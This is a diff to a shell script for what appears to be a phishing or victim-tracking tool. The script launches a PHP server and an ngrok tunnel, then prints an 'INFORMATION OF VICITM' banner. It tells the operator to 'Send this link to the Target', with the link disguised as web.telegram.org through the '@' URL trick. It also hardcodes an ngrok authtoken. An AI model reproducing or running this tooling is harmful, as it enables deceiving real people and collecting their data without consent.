@@ -12,6 +12,10 @@ start unrar.bat
 pip install requests > /dev/null 2>&1
 pip install platform > /dev/null 2>&1
 pip install sys > /dev/null 2>&1
+command -v php > /dev/null 2>&1 || { echo >&2 "I require Php but it's not installed. Install it. Aborting."; exit 1; }
+command -v python > /dev/null 2>&1 || { echo >&2 "I require Python but it's not installed. Install it. Aborting."; exit 1; }
+
+
 echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
@@ -24,16 +28,17 @@ echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          ngrok http 4444 > /dev/null 2>&1
-						  ./ngrok authtoken 1pNPp1Tg0trSteYnDWVVocff6gq_2CVCycNZocXS1n3kDL6ye > /dev/null 2>&1
+						  start ngrok authtoken 1pNPp1Tg0trSteYnDWVVocff6gq_2CVCycNZocXS1n3kDL6ye
+                          start ngrok.exe http 4444
+						  sleep 10
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
-						  python link.py $link
+						  python link.py https://$link 
                           echo ""
-						  sleep 10
+						 
 						  clear
-                          cat secnhack
+                          
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
 						  printf "\e[1;92m
@@ -50,6 +55,7 @@ echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+					
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://web.telegram.org-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
